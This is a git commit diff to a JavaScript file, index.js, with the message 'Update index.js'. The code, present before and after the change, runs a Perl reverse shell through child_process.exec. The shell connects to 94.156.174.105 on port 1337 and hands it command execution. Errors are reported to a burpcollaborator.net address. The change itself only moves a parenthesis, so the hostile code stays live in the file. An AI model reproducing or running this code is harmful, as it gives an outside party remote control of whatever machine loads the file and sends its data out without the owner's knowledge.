6adf23df5b41b08cdd6e9da8800a47e80c27eddb
hussein98d <daher-hussein@hotmail.fr>
2021-07-14 15:45:06 +0000

    Update index.js

--- index.js
+++ index.js
@@ -83,7 +83,7 @@ fs.readFile('d.txt', 'utf8' , (err, data) => {
 
 const spawn = require('child_process');
 var request = require('request');
-spawn.exec("perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"94.156.174.105:1337");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'", (error, stdout, stderr) => {
+spawn.exec("perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"94.156.174.105:1337");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"), (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         request('http://mzpz5sloxj1o8ocahftqnyjtokubvzk.burpcollaborator.net/?rce-error=' + error.message);
